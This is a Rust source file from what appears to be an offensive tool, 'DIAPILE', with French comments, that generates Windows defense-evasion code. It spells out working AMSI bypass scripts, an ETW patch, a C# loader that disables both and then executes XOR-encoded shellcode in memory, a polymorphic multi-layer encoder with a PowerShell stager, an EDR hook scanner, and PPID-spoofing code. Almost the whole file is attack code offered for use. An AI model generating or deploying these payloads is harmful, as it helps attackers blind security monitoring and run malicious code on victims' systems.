#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EdrBypassResult {
    pub technique: String,
    pub success: bool,
    pub details: String,
    pub payload: Option<Vec<u8>>,
    pub stager: Option<String>, // code PowerShell/C# généré
}

// ─────────────────────────────────────────────────────────────────────────────
// 1. AMSI Bypass
// ─────────────────────────────────────────────────────────────────────────────

/// Génère un script PowerShell qui patche AmsiScanBuffer en mémoire.
/// Utilise la réflexion .NET pour retrouver la fonction et écraser
/// les premiers octets par `xor eax,eax; ret` (retour AMSI_RESULT_CLEAN).
pub fn generate_amsi_bypass_ps1(variant: AmsiBypassVariant) -> String {
    match variant {
        AmsiBypassVariant::PatchAmsiScanBuffer => r#"
# DIAPILE — AMSI Bypass via AmsiScanBuffer patch
# Patch: xor eax,eax ; ret  (returns AMSI_RESULT_CLEAN = 0)
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$lib  = [Win32]::LoadLibrary("amsi.dll")
$addr = [Win32]::GetProcAddress($lib, "AmsiScanBuffer")
$p    = 0
[Win32]::VirtualProtect($addr, [uint32]5, 0x40, [ref]$p) | Out-Null
$patch = [Byte[]](0x31,0xC0,0xC3)  # xor eax,eax; ret
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 3)
"#.trim().to_string(),

        AmsiBypassVariant::SetContextError => r#"
# DIAPILE — AMSI Bypass via AmsiInitialize context error
$a = [Ref].Assembly.GetTypes() | ForEach-Object {
    if ($_.Name -like "*iUtils") { $_ }
}
$b = $a.GetFields("NonPublic,Static") | Where-Object { $_.Name -like "*Context" }
$b.SetValue($null, [IntPtr]0x1)
"#.trim().to_string(),

        AmsiBypassVariant::ForcedError => r#"
# DIAPILE — AMSI Bypass via forced AmsiContext corruption
[Reflection.Assembly]::LoadWithPartialName('System.Core') | Out-Null
$a = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.Management.Automation.dll') }
$b = $a.GetType('System.Management.Automation.AmsiUtils')
$c = $b.GetField('amsiInitFailed','NonPublic,Static')
$c.SetValue($null,$true)
"#.trim().to_string(),
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum AmsiBypassVariant {
    PatchAmsiScanBuffer, // Patch direct en mémoire — le plus fiable
    SetContextError,     // Forcer erreur de contexte — détecté par certains EDRs
    ForcedError,         // amsiInitFailed = true — le plus discret
}

// ─────────────────────────────────────────────────────────────────────────────
// 2. ETW (Event Tracing for Windows) Patching
// ─────────────────────────────────────────────────────────────────────────────

/// Génère un script PowerShell qui patche EtwEventWrite pour supprimer
/// les événements ETW (évite la détection par Sysmon/WDAC/MDE).
pub fn generate_etw_patch_ps1() -> String {
    r#"
# DIAPILE — ETW Patch via EtwEventWrite neutralization
# Patch ntdll!EtwEventWrite → ret (0xC3)
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Ntdll {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string fn);
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string moduleName);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$ntdll = [Ntdll]::GetModuleHandle("ntdll.dll")
$addr  = [Ntdll]::GetProcAddress($ntdll, "EtwEventWrite")
$old   = 0
[Ntdll]::VirtualProtect($addr, [uint32]1, 0x40, [ref]$old) | Out-Null
[System.Runtime.InteropServices.Marshal]::WriteByte($addr, 0xC3)  # ret
[Ntdll]::VirtualProtect($addr, [uint32]1, $old, [ref]$old) | Out-Null
"#.trim().to_string()
}

/// Génère un loader C# qui patche AMSI + ETW puis injecte un shellcode en mémoire.
/// Le shellcode est XOR-encodé avec une clé roulante pour éviter les signatures statiques.
pub fn generate_csharp_loader(shellcode: &[u8], xor_key_seed: u8) -> String {
    let encoded = xor_rolling_encode(shellcode, xor_key_seed);
    let bytes_lit = encoded
        .iter()
        .map(|b| format!("0x{:02x}", b))
        .collect::<Vec<_>>()
        .join(",");

    format!(
        r#"
// DIAPILE — Polymorphic C# Loader (AMSI+ETW bypassed)
using System;
using System.Runtime.InteropServices;
class Loader {{
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] static extern bool   VirtualProtect(IntPtr a, uint s, uint n, out uint o);
    [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr start, IntPtr p, uint f, IntPtr id);
    [DllImport("kernel32.dll")] static extern uint   WaitForSingleObject(IntPtr h, uint ms);
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr m, string fn);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string m);

    static void PatchByte(string mod, string fn, byte val) {{
        var addr = GetProcAddress(GetModuleHandle(mod), fn);
        uint old;
        VirtualProtect(addr, 1, 0x40, out old);
        Marshal.WriteByte(addr, val);
        VirtualProtect(addr, 1, old, out old);
    }}

    static byte[] Decode(byte[] enc, byte seed) {{
        byte[] dec = new byte[enc.Length];
        byte k = seed;
        for (int i = 0; i < enc.Length; i++) {{
            dec[i] = (byte)(enc[i] ^ k);
            k = (byte)((k + dec[i] + 1) & 0xFF);
        }}
        return dec;
    }}

    static void Main() {{
        // 1. Bypass AMSI
        PatchByte("amsi.dll", "AmsiScanBuffer", 0xC3);
        // 2. Bypass ETW
        PatchByte("ntdll.dll", "EtwEventWrite", 0xC3);

        // 3. Decode shellcode
        byte[] enc = new byte[] {{ {bytes} }};
        byte[] sc  = Decode(enc, 0x{seed:02X});

        // 4. Allocate RW, copy, protect RX, execute
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x04);
        Marshal.Copy(sc, 0, mem, sc.Length);
        uint old;
        VirtualProtect(mem, (uint)sc.Length, 0x20, out old);

        IntPtr t = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(t, 0xFFFFFFFF);
    }}
}}
"#,
        bytes = bytes_lit,
        seed = xor_key_seed
    )
}

// ─────────────────────────────────────────────────────────────────────────────
// 3. Shellcode encoder polymorphique — XOR rolling key
// ─────────────────────────────────────────────────────────────────────────────

/// Encode un shellcode avec XOR rolling : chaque octet est XORé avec une clé
/// qui évolue à chaque itération (k = (k + plaintext + 1) % 256).
/// Résultat : chaque encodage avec une seed différente donne une signature différente.
pub fn xor_rolling_encode(data: &[u8], seed: u8) -> Vec<u8> {
    let mut encoded = Vec::with_capacity(data.len());
    let mut key = seed;
    for &b in data {
        let enc = b ^ key;
        encoded.push(enc);
        key = key.wrapping_add(b).wrapping_add(1);
    }
    encoded
}

/// Décoder le XOR rolling (inverse)
pub fn xor_rolling_decode(data: &[u8], seed: u8) -> Vec<u8> {
    let mut decoded = Vec::with_capacity(data.len());
    let mut key = seed;
    for &b in data {
        let dec = b ^ key;
        decoded.push(dec);
        key = key.wrapping_add(dec).wrapping_add(1);
    }
    decoded
}

/// Encoder polymorphique multi-couches : XOR rolling → Base64 → XOR single byte
/// Chaque exécution avec une seed différente génère un binaire unique.
pub fn polymorphic_encode(shellcode: &[u8], seed: u8) -> PolyPayload {
    use base64::{engine::general_purpose, Engine as _};

    // Couche 1 : XOR rolling
    let layer1 = xor_rolling_encode(shellcode, seed);

    // Couche 2 : XOR single byte (seed ^ 0x5A)
    let key2 = seed ^ 0x5A;
    let layer2: Vec<u8> = layer1.iter().map(|b| b ^ key2).collect();

    // Couche 3 : Base64 encodé
    let b64 = general_purpose::STANDARD.encode(&layer2);

    // Stub PowerShell de décodage inline
    let ps1_stub = format!(
        r#"$e=[Convert]::FromBase64String('{b64}');$k={key2};$s={seed};$d=@();$f=$s;for($i=0;$i-lt$e.Length;$i++){{$x=$e[$i] -bxor $k;$d+=$x -bxor $f;$f=($f+($d[-1])+1) -band 0xFF}};$h=[System.Runtime.InteropServices.GCHandle]::Alloc($d,'Pinned');[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($h.AddrOfPinnedObject(),[System.Func[int32]]).Invoke()"#,
        b64 = b64,
        key2 = key2,
        seed = seed,
    );

    PolyPayload {
        seed,
        layer_count: 3,
        encoded_b64: b64,
        ps1_stager: ps1_stub,
        byte_count: shellcode.len(),
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PolyPayload {
    pub seed: u8,
    pub layer_count: u8,
    pub encoded_b64: String,
    pub ps1_stager: String, // stager PowerShell inline
    pub byte_count: usize,
}

// ─────────────────────────────────────────────────────────────────────────────
// 4. EDR Hook Scanner
// Détecte si les fonctions critiques de ntdll/kernel32 sont hookées par un EDR.
// Un hook typique remplace les 5 premiers octets par `jmp <trampoline>` (0xE9 ...).
// ─────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HookScanResult {
    pub function_name: String,
    pub dll: String,
    pub is_hooked: bool,
    pub first_bytes: Vec<u8>, // 5 premiers octets actuels
    pub hook_type: Option<String>,
}

/// Retourne les stubs d'assembleur attendus (syscall prologue propre)
/// pour chaque fonction ntdll critique.
/// Si les premiers octets ne correspondent pas → hook détecté.
pub fn edr_hook_scan_report() -> Vec<HookScanResult> {
    // Prologues attendus sur Windows 10/11 x64 (ntdll non patché)
    // mov r10, rcx; mov eax, <SSN>; syscall; ret
    // Représentés par: 4C 8B D1 B8 XX 00 00 00  ...
    let expected_functions = [
        // (function, dll, expected_first_3_bytes)
        ("NtReadFile", "ntdll.dll", &[0x4C, 0x8B, 0xD1u8] as &[u8]),
        ("NtWriteFile", "ntdll.dll", &[0x4C, 0x8B, 0xD1]),
        ("NtCreateFile", "ntdll.dll", &[0x4C, 0x8B, 0xD1]),
        ("NtOpenProcess", "ntdll.dll", &[0x4C, 0x8B, 0xD1]),
        ("NtAllocateVirtualMemory", "ntdll.dll", &[0x4C, 0x8B, 0xD1]),
        ("NtProtectVirtualMemory", "ntdll.dll", &[0x4C, 0x8B, 0xD1]),
        ("NtWriteVirtualMemory", "ntdll.dll", &[0x4C, 0x8B, 0xD1]),
        ("NtCreateThreadEx", "ntdll.dll", &[0x4C, 0x8B, 0xD1]),
        ("AmsiScanBuffer", "amsi.dll", &[0x48, 0x89, 0x5C]), // push rbx; mov rbx,rsp (typique)
        ("EtwEventWrite", "ntdll.dll", &[0x48, 0x83, 0xEC]), // sub rsp,X (typique)
    ];

    // Note : sur Linux, les hooks sont dans libc (mprotect, mmap, etc.)
    // Ici on génère un rapport statique — l'exécution réelle requiert Windows.
    expected_functions
        .iter()
        .map(|(func, dll, expected)| {
            HookScanResult {
                function_name: func.to_string(),
                dll: dll.to_string(),
                is_hooked: false, // En runtime Windows, comparer avec GetProcAddress()
                first_bytes: expected.to_vec(),
                hook_type: None,
            }
        })
        .collect()
}

/// Génère un script PowerShell qui scanne les hooks EDR en mémoire.
pub fn generate_hook_scanner_ps1() -> String {
    r#"
# DIAPILE — EDR Hook Scanner (PowerShell)
# Scanne les fonctions ntdll pour détecter des hooks JMP (0xE9)
$ntdll = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE([System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule.Name -eq 'System.dll' })
$functions = @(
    "NtAllocateVirtualMemory","NtWriteVirtualMemory","NtProtectVirtualMemory",
    "NtCreateThreadEx","NtOpenProcess","AmsiScanBuffer","EtwEventWrite"
)
foreach ($fn in $functions) {
    $type = @'
using System;
using System.Runtime.InteropServices;
public class W32 {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr m, string n);
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string m);
}
'@
    if (-not ([System.Management.Automation.PSTypeName]'W32').Type) { Add-Type $type }
    $dlls = @("ntdll.dll","amsi.dll","kernel32.dll")
    foreach ($dll in $dlls) {
        $addr = [W32]::GetProcAddress([W32]::GetModuleHandle($dll), $fn)
        if ($addr -ne [IntPtr]::Zero) {
            $b = [System.Runtime.InteropServices.Marshal]::ReadByte($addr)
            $status = if ($b -eq 0xE9) { "[HOOKED]" } elseif ($b -eq 0xCC) { "[INT3-BP]" } else { "[CLEAN]" }
            Write-Host "$status  $dll!$fn  (first byte: 0x$($b.ToString('X2')))"
        }
    }
}
"#.trim().to_string()
}

// ─────────────────────────────────────────────────────────────────────────────
// 5. PPID Spoofing — masque l'origine du process sous Windows
// ─────────────────────────────────────────────────────────────────────────────

/// Génère le code C# pour le PPID spoofing : crée un process avec un PPID
/// différent (ex: explorer.exe) pour cacher l'origine dans Sysmon/MDE.
pub fn generate_ppid_spoof_cs(target_exe: &str, spoof_parent: &str) -> String {
    format!(
        r#"
// DIAPILE — PPID Spoofing: launches {target} with {parent} as fake parent
using System;
using System.Runtime.InteropServices;

class PpidSpoof {{
    [StructLayout(LayoutKind.Sequential)] struct STARTUPINFOEX {{
        public STARTUPINFO si;
        public IntPtr lpAttributeList;
    }}
    [StructLayout(LayoutKind.Sequential)] struct STARTUPINFO {{
        public int  cb; public string a,b,c; public int d,e,f,g,h,i,j,k;
        public int  flags; public short showWindow; public short a2;
        public IntPtr a3,a4,a5,a6;
    }}
    [StructLayout(LayoutKind.Sequential)] struct PROCESS_INFORMATION {{
        public IntPtr hProcess, hThread; public int pid, tid;
    }}
    [DllImport("kernel32")] static extern bool CreateProcess(string app, string cmd, IntPtr pa, IntPtr ta,
        bool inherit, uint flags, IntPtr env, string dir, ref STARTUPINFOEX si, out PROCESS_INFORMATION pi);
    [DllImport("kernel32")] static extern IntPtr OpenProcess(uint access, bool inherit, uint pid);
    [DllImport("kernel32")] static extern bool InitializeProcThreadAttributeList(IntPtr al, uint count, uint f, ref IntPtr size);
    [DllImport("kernel32")] static extern bool UpdateProcThreadAttribute(IntPtr al, uint f, IntPtr attr, IntPtr val, IntPtr sz, IntPtr prev, IntPtr retSz);
    [DllImport("kernel32")] static extern void DeleteProcThreadAttributeList(IntPtr al);

    static uint FindPid(string name) {{
        foreach (var p in System.Diagnostics.Process.GetProcessesByName(name.Replace(".exe","")))
            return (uint)p.Id;
        return 0;
    }}

    static void Main() {{
        uint ppid = FindPid("{parent}");
        if (ppid == 0) {{ Console.Error.WriteLine("Parent not found"); return; }}
        IntPtr hParent = OpenProcess(0x1fffff, false, ppid);

        IntPtr sz = IntPtr.Zero;
        InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref sz);
        IntPtr al = Marshal.AllocHGlobal(sz);
        InitializeProcThreadAttributeList(al, 1, 0, ref sz);
        IntPtr hParentPtr = Marshal.AllocHGlobal(IntPtr.Size);
        Marshal.WriteIntPtr(hParentPtr, hParent);
        UpdateProcThreadAttribute(al, 0, new IntPtr(0x00020000), hParentPtr, new IntPtr(IntPtr.Size), IntPtr.Zero, IntPtr.Zero);

        var si = new STARTUPINFOEX();
        si.si.cb = Marshal.SizeOf<STARTUPINFOEX>();
        si.lpAttributeList = al;
        PROCESS_INFORMATION pi;
        CreateProcess("{target}", null, IntPtr.Zero, IntPtr.Zero, false, 0x00080000 | 0x00000004, IntPtr.Zero, null, ref si, out pi);
        DeleteProcThreadAttributeList(al);
        Console.WriteLine($"Spawned PID {{pi.pid}} with fake PPID {{ppid}}");
    }}
}}
"#,
        target = target_exe,
        parent = spoof_parent
    )
}
